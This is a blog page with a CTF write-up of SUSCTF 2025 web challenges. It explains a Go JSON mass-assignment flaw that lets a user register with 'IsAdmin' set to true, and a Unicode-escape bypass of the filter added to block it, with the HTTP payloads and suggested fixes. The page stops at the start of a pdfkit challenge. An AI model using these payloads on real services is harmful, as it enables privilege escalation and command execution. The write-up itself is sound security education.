@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KaGty1" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      SUSCTF(2025) Web &amp;&amp; Panest Writeup 
+      
+      
+      |
+    
+     KaGty1 &#39;s Personal Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
+    <link rel="icon" href="/images/kagty1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/kagty1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">kagty1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/ctf/">
+          <a href="/ctf/">CTF</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">SUSCTF(2025) Web && Panest Writeup</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2025-10-13 16:02:22
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="SUS-2025-CTF"><a href="#SUS-2025-CTF" class="headerlink" title="SUS(2025) CTF"></a>SUS(2025) CTF</h1><p>东南大学CTF(2025)，题目质量很高。</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="am-i-admin"><a href="#am-i-admin" class="headerlink" title="am i admin?"></a>am i admin?</h3><p><code>Go</code>代码审计，<code>main.go</code>代码如下所示：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT_STR = <span class="string">&quot;:8080&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	adminPassword := GenRandomSeq(<span class="number">16</span>)</span><br><span class="line">	log.Printf(<span class="string">&quot;Admin password: %s\n&quot;</span>, adminPassword)</span><br><span class="line">	adminUserCreds := UserCreds&#123;</span><br><span class="line">		Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">		Password: adminPassword,</span><br><span class="line">		IsAdmin:  <span class="literal">true</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	store := NewSessionStore()</span><br><span class="line">	userDB := NewUserDB()</span><br><span class="line">	userDB.Lock()</span><br><span class="line">	userDB.users[<span class="string">&quot;admin&quot;</span>] = adminUserCreds</span><br><span class="line">	userDB.Unlock()</span><br><span class="line">	auth := &amp;Auth&#123;</span><br><span class="line">		AdminPassword: adminPassword,</span><br><span class="line">		Store:         store,</span><br><span class="line">		UserDB:        userDB,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/register&quot;</span>, auth.RegisterHandler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/login&quot;</span>, auth.LoginHandler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/logout&quot;</span>, auth.LogoutHandler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/run&quot;</span>, auth.RequireAdmin(RunCommandHandler))</span><br><span class="line"></span><br><span class="line">	log.Printf(<span class="string">&quot;Server running on %s\n&quot;</span>, PORT_STR)</span><br><span class="line">	log.Fatal(http.ListenAndServe(PORT_STR, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其中<code>/run</code>提供了命令执行方法<code>RunCommandHandler</code>，跟进：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RunCommandHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> body RunCommandReq</span><br><span class="line">	json.NewDecoder(r.Body).Decode(&amp;body)</span><br><span class="line">	out, err := exec.Command(body.Cmd, body.Args...).CombinedOutput()</span><br><span class="line">	resp := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line">		<span class="string">&quot;output&quot;</span>: <span class="type">string</span>(out),</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		resp[<span class="string">&quot;error&quot;</span>] = err.Error()</span><br><span class="line">	&#125;</span><br><span class="line">	json.NewEncoder(w).Encode(resp)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是调用该方法需要<code>Admin</code>权限。</p>
+<p><code>auth.go</code>代码如下所示：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> UserCreds <span class="keyword">struct</span> &#123;</span><br><span class="line">	Username <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span></span><br><span class="line">	Password <span class="type">string</span> <span class="string">`json:&quot;password&quot;`</span></span><br><span class="line">	IsAdmin  <span class="type">bool</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> SessionStore <span class="keyword">struct</span> &#123;</span><br><span class="line">	sync.Mutex</span><br><span class="line">	sessions <span class="keyword">map</span>[<span class="type">string</span>]UserCreds <span class="comment">// sessionID -&gt; UserCreds</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewSessionStore</span><span class="params">()</span></span> *SessionStore &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;SessionStore&#123;sessions: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]UserCreds)&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> UserDB <span class="keyword">struct</span> &#123;</span><br><span class="line">	sync.Mutex</span><br><span class="line">	users <span class="keyword">map</span>[<span class="type">string</span>]UserCreds <span class="comment">// username -&gt; creds</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewUserDB</span><span class="params">()</span></span> *UserDB &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;UserDB&#123;users: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]UserCreds)&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Auth <span class="keyword">struct</span> &#123;</span><br><span class="line">	AdminPassword <span class="type">string</span></span><br><span class="line">	Store         *SessionStore</span><br><span class="line">	UserDB        *UserDB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Auth)</span></span> RegisterHandler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	<span class="keyword">var</span> c UserCreds</span><br><span class="line">	json.NewDecoder(r.Body).Decode(&amp;c)</span><br><span class="line">	<span class="keyword">if</span> c.Username == <span class="string">&quot;&quot;</span> || c.Password == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;username and password required&quot;</span>, http.StatusBadRequest)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> c.Username == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;cannot register as admin&quot;</span>, http.StatusForbidden)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	a.UserDB.Lock()</span><br><span class="line">	<span class="keyword">defer</span> a.UserDB.Unlock()</span><br><span class="line">	<span class="keyword">if</span> _, exists := a.UserDB.users[c.Username]; exists &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;username already exists&quot;</span>, http.StatusConflict)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	a.UserDB.users[c.Username] = c</span><br><span class="line">	w.Write([]<span class="type">byte</span>(<span class="string">&quot;register success&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Auth)</span></span> LoginHandler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	<span class="keyword">var</span> c UserCreds</span><br><span class="line">	json.NewDecoder(r.Body).Decode(&amp;c)</span><br><span class="line">	a.UserDB.Lock()</span><br><span class="line">	user, ok := a.UserDB.users[c.Username]</span><br><span class="line">	a.UserDB.Unlock()</span><br><span class="line">	<span class="keyword">if</span> ok &amp;&amp; user.Password == c.Password &#123;</span><br><span class="line">		<span class="keyword">if</span> user.Username == <span class="string">&quot;admin&quot;</span> &amp;&amp; user.Password == a.AdminPassword &#123;</span><br><span class="line">			user.IsAdmin = <span class="literal">true</span></span><br><span class="line">		&#125;</span><br><span class="line">		sessionID := GenRandomSeq(<span class="number">32</span>)</span><br><span class="line">		a.Store.Lock()</span><br><span class="line">		a.Store.sessions[sessionID] = user</span><br><span class="line">		a.Store.Unlock()</span><br><span class="line">		http.SetCookie(w, &amp;http.Cookie&#123;Name: <span class="string">&quot;session_id&quot;</span>, Value: sessionID, Path: <span class="string">&quot;/&quot;</span>&#125;)</span><br><span class="line">		fmt.Fprintf(w, <span class="string">&quot;user %s logged in&quot;</span>, user.Username)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	http.Error(w, <span class="string">&quot;invalid credentials&quot;</span>, http.StatusUnauthorized)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Auth)</span></span> LogoutHandler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	cookie, err := r.Cookie(<span class="string">&quot;session_id&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;no session, are you logged in?&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	a.Store.Lock()</span><br><span class="line">	<span class="built_in">delete</span>(a.Store.sessions, cookie.Value)</span><br><span class="line">	a.Store.Unlock()</span><br><span class="line">	w.Write([]<span class="type">byte</span>(<span class="string">&quot;user logged out&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Auth)</span></span> RequireAdmin(next http.HandlerFunc) http.HandlerFunc &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">		cookie, err := r.Cookie(<span class="string">&quot;session_id&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(w, <span class="string">&quot;not logged in&quot;</span>, http.StatusUnauthorized)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		a.Store.Lock()</span><br><span class="line">		user, ok := a.Store.sessions[cookie.Value]</span><br><span class="line">		a.Store.Unlock()</span><br><span class="line">		<span class="keyword">if</span> !ok || !user.IsAdmin &#123;</span><br><span class="line">			http.Error(w, <span class="string">&quot;admin only&quot;</span>, http.StatusForbidden)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		next(w, r)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>漏洞出现的代码部分如下所示：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> UserDB <span class="keyword">struct</span> &#123;</span><br><span class="line">	sync.Mutex</span><br><span class="line">	users <span class="keyword">map</span>[<span class="type">string</span>]UserCreds <span class="comment">// username -&gt; creds</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Auth <span class="keyword">struct</span> &#123;</span><br><span class="line">	AdminPassword <span class="type">string</span></span><br><span class="line">	Store         *SessionStore</span><br><span class="line">	UserDB        *UserDB</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> UserCreds <span class="keyword">struct</span> &#123;</span><br><span class="line">	Username <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span></span><br><span class="line">	Password <span class="type">string</span> <span class="string">`json:&quot;password&quot;`</span></span><br><span class="line">	IsAdmin  <span class="type">bool</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Auth)</span></span> RegisterHandler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	<span class="keyword">var</span> c UserCreds</span><br><span class="line">	json.NewDecoder(r.Body).Decode(&amp;c)</span><br><span class="line">	</span><br><span class="line">	... ...</span><br><span class="line"></span><br><span class="line">	a.UserDB.users[c.Username] = c</span><br><span class="line">	w.Write([]<span class="type">byte</span>(<span class="string">&quot;register success&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>问题出在<code>UserCreds</code>结构体的写法中</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span></span><br></pre></td></tr></table></figure>
+
+<p>的意思是将该结构体序列化&#x2F;反序列化为<code>JSON</code>时，使用<code>&quot;username&quot;</code>作为<code>JSON</code>字段名，例如<code>&quot;username&quot;:&quot;alice&quot;</code>就会被映射到这个字段	，<code>&quot;password&quot;</code>同理。</p>
+<p><code>IsAdmin  bool</code>虽然没有<code>json</code>标签，但是会默认使用字段名<code>&quot;IsAdmin&quot;</code>，也就是说可以用<code>&quot;IsAdmin&quot;:true</code>来注册一个有管理员权限的用户。</p>
+<p><code>Payload</code>如下所示：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/register</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>106.14.191.23:51308</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;kagty1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;kagty1&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;IsAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>登录拿<code>Cookie</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251004223442-r64vaye.png" alt="image-20251004223442-r64vaye"></p>
+<p>调用<code>run</code>路由命令执行拿<code>flag</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251004223509-3sa3ewa.png" alt="image-20251004223509-3sa3ewa"></p>
+<p>‍</p>
+<p><strong>思考修复方案</strong></p>
+<p>1、使用<code>json:&quot;-&quot;</code>显示忽略</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IsAdmin <span class="type">bool</span> <span class="string">`json:&quot;-&quot;`</span></span><br></pre></td></tr></table></figure>
+
+<p>2、使用私有字段（小写开头）</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">isAdmin <span class="type">bool</span> <span class="comment">// 小写，非导出字段</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="am-i-admin-2"><a href="#am-i-admin-2" class="headerlink" title="am i admin? 2"></a>am i admin? 2</h3><p>还是上面那个漏洞点，只是在<code>RegisterHandler</code>方法中加了检测</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Auth)</span></span> RegisterHandler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	body, _ := io.ReadAll(r.Body)</span><br><span class="line">	bodyStr := <span class="type">string</span>(body)</span><br><span class="line">	<span class="keyword">if</span> strings.Contains(bodyStr, <span class="string">&quot;IsAdmin&quot;</span>) &#123;</span><br><span class="line">		http.Error(w, <span class="string">&quot;not allowed!&quot;</span>, http.StatusForbidden)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> c UserCreds</span><br><span class="line">	json.Unmarshal(body, &amp;c)</span><br><span class="line">	</span><br><span class="line">	......</span><br><span class="line"></span><br><span class="line">	a.UserDB.users[c.Username] = c</span><br><span class="line">	w.Write([]<span class="type">byte</span>(<span class="string">&quot;register success&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过很简单，<code>Go</code>语言中<code>json.Unmarshal</code>方法支持解析<code>Unicode</code>编码，编码绕过即可</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/register</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>106.14.191.23:50958</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>3</span><br><span class="line"></span><br><span class="line"><span class="language-nix">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;kagty1&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;kagty1&quot;</span>, <span class="string">&quot;<span class="char escape_">\u</span>0049sAdmin&quot;</span>: <span class="literal">true</span>&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251004225441-25hk62o.png" alt="image-20251004225441-25hk62o"></p>
+<p>‍</p>
+<h3 id="easyprint"><a href="#easyprint" class="headerlink" title="easyprint"></a>easyprint</h3><p><code>main.py</code>​</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, send_file</span><br><span class="line"><span class="keyword">import</span> pdfkit</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">options = &#123;<span class="string">&quot;disable-javascript&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    default_html = <span class="string">&quot;&lt;html&gt;&lt;h2&gt;Hello PDF&lt;/h2&gt;&lt;p&gt;This is sample text that will be converted to PDF.&lt;/p&gt;&lt;/html&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, default_html=default_html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/generate_pdf&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_pdf</span>():</span><br><span class="line">    html_content = request.form.get(<span class="string">&quot;html_content&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pdf = pdfkit.from_string(html_content, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> send_file(</span><br><span class="line">        io.BytesIO(pdf),</span><br><span class="line">        mimetype=<span class="string">&quot;application/pdf&quot;</span>,</span><br><span class="line">        as_attachment=<span class="literal">True</span>,</span><br><span class="line">        download_name=<span class="string">&quot;generated.pdf&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">3333</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>Python</code>开源库<code>pdfkit</code>，提供将用户输入的<code>HTML</code>转换成<code>PDF</code>文件的功能，其实底层使用的是<code>wkhtmltopdf</code>命令行进行的转换，我跟进了<code>to_pdf</code>方法：</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251013155542968.png" alt="image-20251013155542968"></p>
+<p>‍</p>
